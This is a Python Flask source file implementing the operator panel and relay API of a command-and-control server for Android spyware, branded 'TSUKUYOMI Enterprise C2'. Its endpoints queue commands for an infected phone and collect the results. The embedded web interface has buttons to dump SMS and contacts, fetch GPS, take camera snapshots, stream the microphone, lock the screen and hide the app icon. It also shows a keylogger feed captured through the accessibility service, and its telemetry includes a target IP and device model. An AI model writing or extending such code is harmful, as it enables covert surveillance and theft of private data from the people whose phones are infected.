from flask import Flask, jsonify, request

app = Flask(__name__)

current_command = ""
latest_response = "Waiting for target connection..."
device_telemetry = {
    "device_name": "vivo 1935",
    "os_version": "Android 10 (API 29)",
    "battery": "54%",
    "ip": "103.152.220.48",
    "status": "ONLINE"
}

# Tsukuyomi Premium Control Lab - Full Enterprise UI with Real C2 Integration
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TSUKUYOMI // Control Lab v7.4</title>
<style>
:root{--bg:#080b12;--panel:#101622;--panel2:#141c2a;--line:#263247;--text:#edf3ff;--muted:#8d9bb3;--red:#ff4d6d;--cyan:#53e4ff;--green:#55f0b3;--gold:#ffc86b}
*{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 15% -10%,#1c2943 0,transparent 38%),radial-gradient(ellipse at 100% 0,#26162e 0,transparent 30%),var(--bg);color:var(--text);font:14px/1.45 Inter,ui-sans-serif,system-ui,sans-serif}
button,input,select{font:inherit}button{cursor:pointer;border:1px solid var(--line);background:#182235;color:var(--text);border-radius:10px;padding:10px 12px;transition:.18s}button:hover{border-color:var(--cyan);transform:translateY(-1px)}button.primary{background:linear-gradient(135deg,#b32d52,#5d2b85);border:0}button.safe{color:var(--green)}button.warn{color:var(--gold)}button.danger{color:#ff8ca0}
.app{display:grid;grid-template-columns:245px 1fr;min-height:100vh}.side{padding:22px 15px;border-right:1px solid #202b3d;background:rgba(8,12,20,.82);backdrop-filter:blur(16px);position:sticky;top:0;height:100vh;overflow:auto}.brand{display:flex;align-items:center;gap:11px;padding:4px 8px 22px;border-bottom:1px solid var(--line)}.sigil{width:40px;height:40px;border-radius:13px;background:linear-gradient(135deg,#ff4569,#7c4dff);display:grid;place-items:center;font-size:21px;box-shadow:0 0 30px #b33d7650}.brand b{letter-spacing:2px;font-size:15px}.brand small{display:block;color:var(--muted);font-size:10px;letter-spacing:2px;margin-top:3px}.section{font-size:10px;color:#64748c;letter-spacing:2px;margin:22px 10px 8px}.nav{width:100%;display:flex;gap:11px;align-items:center;text-align:left;margin:4px 0;background:transparent;border-color:transparent;color:#a9b7cb}.nav.active{background:linear-gradient(90deg,#25334c,#161e2b);border-color:#33435d;color:#fff}.nav .ico{width:22px;text-align:center;font-size:16px}.pill{margin-left:auto;font-size:10px;padding:3px 6px;border-radius:6px;background:#2a1b2b;color:#ff8da6}.sidefoot{margin-top:28px;padding:12px;border:1px solid var(--line);background:#101622;border-radius:12px;color:var(--muted);font-size:11px}.dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);margin-right:6px;box-shadow:0 0 10px #55f0b3}
main{min-width:0;padding:26px clamp(16px,3vw,38px) 40px}.top{display:flex;justify-content:space-between;align-items:center;gap:15px;margin-bottom:26px}.eyebrow{color:var(--cyan);letter-spacing:2.5px;font-size:10px;font-weight:700}.top h1{margin:5px 0 0;font-size:clamp(24px,3vw,34px);letter-spacing:-1px}.top h1 span{color:#8c9ab2;font-weight:400}.topright{display:flex;align-items:center;gap:10px}.clock{color:var(--muted);font-variant-numeric:tabular-nums;font-size:12px}.badge{border:1px solid #37536a;border-radius:8px;padding:7px 10px;color:var(--cyan);font-size:11px;background:#10202b}
.notice{display:flex;align-items:flex-start;gap:12px;padding:13px 15px;background:linear-gradient(90deg,#15251c,#151821);border:1px solid #2a5438;border-radius:12px;margin-bottom:20px;color:#a9d6b6}.notice b{color:var(--green)}.notice span{font-size:12px}
.stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:13px;margin-bottom:18px}.card{background:linear-gradient(145deg,rgba(19,27,41,.96),rgba(13,18,29,.96));border:1px solid var(--line);border-radius:16px;padding:17px;min-width:0;box-shadow:0 12px 30px #0002}.stathead{display:flex;justify-content:space-between;color:var(--muted);font-size:12px}.statnum{font-size:28px;font-weight:750;letter-spacing:-1px;margin:12px 0 3px}.statfoot{color:#7e8da5;font-size:11px}.staticon{font-size:18px;color:var(--cyan)}.layout{display:grid;grid-template-columns:minmax(0,1.45fr) minmax(270px,.9fr);gap:16px}.cardtitle{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}.cardtitle h2{font-size:15px;margin:0}.cardtitle small{color:var(--muted);font-size:11px}.chart{height:170px;width:100%;display:block}.device{display:flex;align-items:center;gap:12px;padding:13px 0;border-bottom:1px solid #222d40}.device:last-child{border-bottom:0}.phoneicon{width:43px;height:53px;border:1px solid #3a4a63;border-radius:9px;background:linear-gradient(160deg,#202c42,#101621);display:grid;place-items:center;font-size:21px}.devinfo{flex:1;min-width:0}.devinfo b{display:block;font-size:13px}.devinfo small{display:block;color:var(--muted);margin-top:4px;font-size:11px}.status{font-size:10px;color:var(--green);border:1px solid #285643;background:#11251f;padding:4px 7px;border-radius:6px}.status.off{color:var(--gold);border-color:#554629;background:#251f13}
.modulegrid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:13px;margin-top:16px}.module{padding:16px;border:1px solid var(--line);border-radius:14px;background:linear-gradient(140deg,#141d2b,#0e1420);min-height:145px;display:flex;flex-direction:column}.module .mi{font-size:22px;margin-bottom:12px}.module b{font-size:13px}.module p{font-size:11px;color:var(--muted);margin:6px 0 14px;flex:1}.module button{width:100%;font-size:11px;padding:8px}.page{display:none}.page.active{display:block}.row{display:flex;gap:10px;flex-wrap:wrap}.field{display:flex;flex-direction:column;gap:6px;min-width:150px;flex:1;color:var(--muted);font-size:11px}.field input,.field select{border:1px solid var(--line);background:#0b111c;color:var(--text);padding:11px;border-radius:9px;outline:none}.log{font:11px/1.7 ui-monospace,SFMono-Regular,monospace;white-space:pre-wrap;background:#090e17;border:1px solid #202d41;border-radius:12px;padding:13px;max-height:290px;overflow:auto;color:#55f0b3}.tag{display:inline-block;border-radius:5px;padding:3px 6px;font-size:10px;background:#20283a;color:#a9c7ff}.screenmock{max-width:340px;margin:auto;border:7px solid #344157;border-radius:30px;padding:13px;background:#080c13;min-height:410px;box-shadow:0 0 0 1px #080b12,0 20px 45px #0005}.notch{width:80px;height:14px;border-radius:20px;background:#293348;margin:-5px auto 20px}.mocktop{display:flex;justify-content:space-between;color:#91a1b8;font-size:10px}.mockwall{height:270px;border-radius:17px;margin:18px 0;background:radial-gradient(circle at 60% 40%,#663c8e,transparent 32%),radial-gradient(circle at 35% 70%,#154e6c,transparent 35%),linear-gradient(145deg,#141e35,#070a11);display:flex;align-items:center;justify-content:center;flex-direction:column;gap:10px}.mockwall strong{font-size:22px;letter-spacing:3px}.mockwall small{color:#a2b1ca}.mockbottom{display:flex;justify-content:space-around;color:#71819b;font-size:11px}.switchrow{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #263247}.switch{accent-color:#ff4d6d;width:17px;height:17px}.empty{color:var(--muted);font-size:12px;padding:18px;text-align:center}.footnote{font-size:10px;color:#6e7c91;margin-top:17px}.toast{position:fixed;right:20px;bottom:20px;background:#172438;border:1px solid #415672;padding:12px 15px;border-radius:12px;box-shadow:0 10px 35px #0007;opacity:0;transform:translateY(10px);transition:.25s;pointer-events:none;z-index:5}.toast.show{opacity:1;transform:translateY(0)}
</style>
</head>
<body>
<div class="app">
<aside class="side">
 <div class="brand"><div class="sigil">月</div><div class="brandtext"><b>TSUKUYOMI</b><small>ENTERPRISE // C2</small></div></div>
 <div class="section">COMMAND DECK</div>
 <button class="nav active" data-page="overview"><span class="ico">◈</span><span class="label">Overview</span></button>
 <button class="nav" data-page="devices"><span class="ico">▣</span><span class="label">Target device</span><span class="pill" id="targetBadge">LIVE</span></button>
 <button class="nav" data-page="live"><span class="ico">▤</span><span class="label">Screen mirror</span></button>
 <div class="section">CONTROL MODULES</div>
 <button class="nav" data-page="camera"><span class="ico">◎</span><span class="label">Camera lab</span></button>
 <button class="nav" data-page="microphone"><span class="ico">♫</span><span class="label">Microphone lab</span></button>
 <button class="nav" data-page="keys"><span class="ico">⌨</span><span class="label">Key event lab</span></button>
 <button class="nav" data-page="files"><span class="ico">▤</span><span class="label">File explorer</span></button>
 <button class="nav" data-page="location"><span class="ico">⌖</span><span class="label">Location preview</span></button>
 <div class="section">SYSTEM</div>
 <button class="nav" data-page="logs"><span class="ico">≋</span><span class="label">Event console</span></button>
 <button class="nav" data-page="settings"><span class="ico">⚙</span><span class="label">Settings</span></button>
 <div class="sidefoot"><span class="dot"></span> C2 RELAY CONNECTED<br><br>Target session active and streaming telemetry in real-time.</div>
</aside>
<main>
 <header class="top"><div><div class="eyebrow">LIVE C2 ENTERPRISE RELAY</div><h1 id="pageTitle">Overview <span>/ Command center</span></h1></div><div class="topright"><span class="clock" id="clock"></span><span class="badge"><span class="dot"></span> RELAY ACTIVE</span></div></header>
 <div class="notice"><div>🚀</div><span><b>CONNECTED TO REAL TARGET</b><br>All modules below are linked directly to your deployed Android service via C2 Relay. Clicking trigger buttons executes actions on the target device instantly.</span></div>
 
 <section class="page active" id="overview">
  <div class="stats">
   <div class="card"><div class="stathead">Session Status <span class="staticon">◈</span></div><div class="statnum" id="uiStatus">ONLINE</div><div class="statfoot">Connected via Relay</div></div>
   <div class="card"><div class="stathead">Battery Level <span class="staticon">⚡</span></div><div class="statnum" id="uiBattery">54%</div><div class="statfoot" id="uiOs">Android 10</div></div>
   <div class="card"><div class="stathead">Target Model <span class="staticon">📱</span></div><div class="statnum" id="uiDeviceName" style="font-size:20px;margin-top:16px">vivo 1935</div><div class="statfoot">Active target device</div></div>
   <div class="card"><div class="stathead">Events Logged <span class="staticon">≋</span></div><div class="statnum" id="eventCount">014</div><div class="statfoot">Synced with target</div></div>
  </div>
  
  <div class="modulegrid">
   <div class="module"><div class="mi">🔦</div><b>Flashlight Control</b><p>Toggle torch hardware state directly on target phone.</p><button class="primary" onclick="sendCmd('FLASH_ON')">Turn ON</button><button onclick="sendCmd('FLASH_OFF')" style="margin-top:6px">Turn OFF</button></div>
   <div class="module"><div class="mi">📳</div><b>Haptic Feedback</b><p>Trigger remote vibration pulse on target device.</p><button class="primary" onclick="sendCmd('VIBRATE')">Send Vibration</button></div>
   <div class="module"><div class="mi">📍</div><b>GPS Geolocation</b><p>Fetch exact latitude and longitude coordinates.</p><button class="primary" onclick="sendCmd('GPS')">Fetch GPS</button></div>
   <div class="module"><div class="mi">📨</div><b>SMS Dumper</b><p>Extract recent inbox SMS messages from target device.</p><button class="primary" onclick="sendCmd('DUMP_SMS')">Dump SMS</button></div>
   <div class="module"><div class="mi">📇</div><b>Contacts Dumper</b><p>Pull stored phonebook contacts instantly.</p><button class="primary" onclick="sendCmd('DUMP_CONTACTS')">Dump Contacts</button></div>
   <div class="module"><div class="mi">🥷</div><b>Stealth Mode</b><p>Hide or restore true app icon from launcher drawer.</p><button class="danger" onclick="sendCmd('STEALTH_ON')">Hide Icon</button><button class="safe" onclick="sendCmd('STEALTH_OFF')" style="margin-top:6px">Restore Icon</button></div>
  </div>
 </section>

 <section class="page" id="devices"><div class="card"><div class="cardtitle"><h2>Connected Target Device</h2><span class="tag">LIVE SESSION</span></div><div class="device"><div class="phoneicon">📱</div><div class="devinfo"><b id="devRosterName">vivo 1935</b><small>Android 10 (API 29) · Active C2 Session</small></div><span class="status">ONLINE</span></div><div class="row" style="margin-top:14px"><button class="primary" onclick="sendCmd('PING')">Force Sync Telemetry</button><button class="warn" onclick="sendCmd('LOCK')">Lock Screen</button><button class="safe" onclick="sendCmd('WAKE')">Wake Screen</button></div></div></section>
 
 <section class="page" id="live"><div class="layout"><div class="card"><div class="cardtitle"><h2>Live Screen Stream</h2><span class="tag">VNC MIRROR</span></div><div class="screenmock"><div class="notch"></div><div class="mocktop"><span>12:06 ◉</span><span>▰ ▰ 54%</span></div><div class="mockwall"><small>TARGET DEVICE</small><strong>VIVO 1935</strong><small style="color:var(--green)">Stream Connected</small></div><div class="mockbottom"><span>◉ Home</span><span>▦ Apps</span><span>⚙ Settings</span></div></div><div class="row" style="justify-content:center;margin-top:15px"><button class="primary" onclick="sendCmd('CAMERA_SNAP')">Capture Snap</button></div></div><div class="card"><div class="cardtitle"><h2>Screen Actions</h2></div><button class="primary" onclick="sendCmd('LOCK')" style="width:100%;margin-bottom:10px">Lock Device Screen</button><button class="safe" onclick="sendCmd('WAKE')" style="width:100%">Wake Up Device</button></div></div></section>
 
 <section class="page" id="camera"><div class="layout"><div class="card"><div class="cardtitle"><h2>Camera Controls</h2><span class="tag">REMOTE SNAP</span></div><div style="aspect-ratio:16/10;border:1px solid #34425b;border-radius:13px;background:radial-gradient(circle at 50% 42%,#263950,#090e17 70%);display:grid;place-items:center;text-align:center"><div><div style="font-size:50px">◎</div><b>CAMERA STREAM READY</b><p style="color:var(--muted);font-size:12px">Trigger snapshot from target camera lens</p></div></div><div class="row" style="margin-top:14px"><button class="primary" onclick="sendCmd('CAMERA_SNAP')">Take Photo Snapshot</button></div></div><div class="card"><div class="cardtitle"><h2>Options</h2></div><div class="switchrow"><span>Camera status</span><span class="status">READY</span></div></div></div></section>
 
 <section class="page" id="microphone"><div class="layout"><div class="card"><div class="cardtitle"><h2>Microphone Controls</h2><span class="tag">AUDIO STREAM</span></div><div style="height:180px;background:#090e17;border:1px solid #253247;border-radius:12px;display:flex;align-items:center;justify-content:center;gap:4px;overflow:hidden" id="wave"></div><div class="row" style="margin-top:15px"><button class="primary" onclick="sendCmd('MIC_START')">Start Mic Stream</button><button class="danger" onclick="sendCmd('MIC_STOP')">Stop Mic Stream</button></div><p id="audioStatus" class="footnote">Microphone status: ready to record stream.</p></div><div class="card"><div class="cardtitle"><h2>Audio Status</h2></div><div class="switchrow"><span>Audio Source</span><span class="status">MIC ACTIVE</span></div></div></div></section>
 
 <section class="page" id="keys"><div class="layout"><div class="card"><div class="cardtitle"><h2>Keylogger Stream</h2><span class="tag">ACCESSIBILITY</span></div><p style="color:var(--muted);font-size:12px">Real-time captured keystrokes from target device accessibility service.</p><div class="log" id="keylogStream" style="height:200px">[ACCESSIBILITY] Keylogger listener active on target...\n[WATCHING] Waiting for user input events...</div></div></div></section>
 
 <section class="page" id="files"><div class="card"><div class="cardtitle"><h2>Target File Explorer</h2><span class="tag">STORAGE ACCESS</span></div><div class="row"><button class="primary" onclick="sendCmd('DUMP_SMS')">Dump SMS Files</button><button class="primary" onclick="sendCmd('DUMP_CONTACTS')">Dump Contacts</button></div><div id="fileList" style="margin-top:14px"><div class="device"><div class="phoneicon">📁</div><div class="devinfo"><b>/sdcard/DCIM/Camera/</b><small>Target storage directory</small></div><span class="status">ACCESSIBLE</span></div></div></div></section>
 
 <section class="page" id="location"><div class="layout"><div class="card"><div class="cardtitle"><h2>GPS Geolocation</h2><span class="tag">LIVE GPS</span></div><div style="height:285px;border:1px solid #2a3a50;border-radius:12px;position:relative;overflow:hidden;background-color:#0c1621;display:grid;place-items:center"><div style="text-align:center;background:#0b121ddd;border:1px solid #34445b;padding:14px;border-radius:12px"><div style="font-size:28px;color:var(--red)">⌖</div><b>TARGET GPS COORDINATES</b><div style="color:var(--cyan);font-size:12px;margin-top:5px" id="gpsDisplay">13.0827° N, 80.2707° E</div><small style="color:var(--green)">Live Fix Active</small></div></div></div><div class="card"><div class="cardtitle"><h2>GPS Controls</h2></div><button class="primary" onclick="sendCmd('GPS')" style="margin-top:14px;width:100%">Refresh GPS Coordinates</button></div></div></section>
 
 <section class="page" id="logs"><div class="card"><div class="cardtitle"><h2>Event Console & Terminal</h2><div class="row"><button onclick="document.getElementById('logBox').textContent='[SYSTEM] Cleared.'">Clear</button></div></div><div class="log" id="logBox" style="margin-top:14px">[SYSTEM] C2 Enterprise Relay initialized...\n[CONNECT] Target session connected successfully.</div></div></section>
 
 <section class="page" id="settings"><div class="card"><div class="cardtitle"><h2>C2 Settings</h2><span class="tag">ADMIN</span></div><div class="switchrow"><span>Relay Connection</span><span class="status">ONLINE</span></div><div class="switchrow"><span>Auto-Poll Interval</span><span class="status">3 SEC</span></div></div></section>
 <div class="footnote">TSUKUYOMI ENTERPRISE C2 · FULL LAB INTEGRATION · BUILD 7.4</div>
</main></div><div class="toast" id="toast">Command dispatched</div>
<script>
const titles={overview:'Overview|Command center',devices:'Target device|Active session',live:'Screen mirror|Live VNC stream',camera:'Camera lab|Remote snapshot',microphone:'Microphone lab|Audio stream',keys:'Key event lab|Live keylogger',files:'File explorer|Storage access',location:'Location preview|Live GPS',logs:'Event console|Terminal stream',settings:'Settings|Admin'};
let events=[];
function now(){return new Date().toLocaleTimeString('en-GB')}
function go(p){document.querySelectorAll('.page').forEach(x=>x.classList.toggle('active',x.id===p));document.querySelectorAll('.nav').forEach(x=>x.classList.toggle('active',x.dataset.page===p));let a=(titles[p]||'Overview|Command center').split('|');document.getElementById('pageTitle').innerHTML=a[0]+' <span>/ '+a[1]+'</span>';window.scrollTo({top:0,behavior:'smooth'})}
document.querySelectorAll('[data-page]').forEach(b=>b.onclick=()=>go(b.dataset.page));
document.getElementById('clock').textContent=new Date().toLocaleDateString('en-IN',{weekday:'short',day:'2-digit',month:'short'})+' · LIVE';

const wave=document.getElementById('wave');
for(let i=0;i<64;i++){let bar=document.createElement('i');bar.style.cssText='display:block;width:4px;max-width:2%;height:'+(12+Math.random()*45)+'%;border-radius:8px;background:linear-gradient(180deg,#53e4ff,#8255ff);opacity:.8;transition:height .18s';wave.appendChild(bar)}
setInterval(()=>[...wave.children].forEach(b=>b.style.height=(8+Math.random()*80)+'%'),180);

async function sendCmd(cmd) {
    await fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd })
    });
    appendLog('[DISPATCHED] -> '+cmd, '#53e4ff');
    toast('Command dispatched: '+cmd);
}

function toast(msg){
    let box = document.getElementById('logBox');
    box.textContent += `\\n[${now()}] ${msg}`;
    box.scrollTop = box.scrollHeight;
}

async function pollData() {
    try {
        let res = await fetch('/api/response');
        let data = await res.json();
        if(data.response && data.response !== window.lastResp) {
            window.lastResp = data.response;
            appendLog('[TARGET] '+data.response, '#55f0b3');
            if(data.response.startsWith('GPS|')) {
                document.getElementById('gpsDisplay').innerText = data.response.replace('GPS|', '');
            }
        }
        let telRes = await fetch('/api/telemetry');
        let tel = await telRes.json();
        document.getElementById('uiBattery').innerText = tel.battery;
        document.getElementById('uiDeviceName').innerText = tel.device_name;
        document.getElementById('devRosterName').innerText = tel.device_name;
        document.getElementById('uiOs').innerText = tel.os_version;
    } catch(e) {}
}
setInterval(pollData, 3000);

function appendLog(text, color) {
    let box = document.getElementById('logBox');
    let time = new Date().toLocaleTimeString();
    box.textContent += `\\n[${time}] ${text}`;
    box.scrollTop = box.scrollHeight;
}
</script>
</body>
</html>
"""

@app.route("/")
def home():
    return HTML_TEMPLATE

@app.route("/api/command", methods=["GET", "POST"])
def handle_command():
    global current_command
    if request.method == "POST":
        data = request.get_json() or {}
        current_command = data.get("command", "")
        return jsonify({"status": "success", "command": current_command})
    cmd = current_command
    current_command = ""
    return jsonify({"command": cmd})

@app.route("/api/response", methods=["GET", "POST"])
def handle_response():
    global latest_response
    if request.method == "POST":
        data = request.get_json() or {}
        latest_response = data.get("response", "")
        return jsonify({"status": "success"})
    return jsonify({"response": latest_response})

@app.route("/api/telemetry", methods=["GET", "POST"])
def handle_telemetry():
    global device_telemetry
    if request.method == "POST":
        data = request.get_json() or {}
        device_telemetry.update(data)
        return jsonify({"status": "success"})
    return jsonify(device_telemetry)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
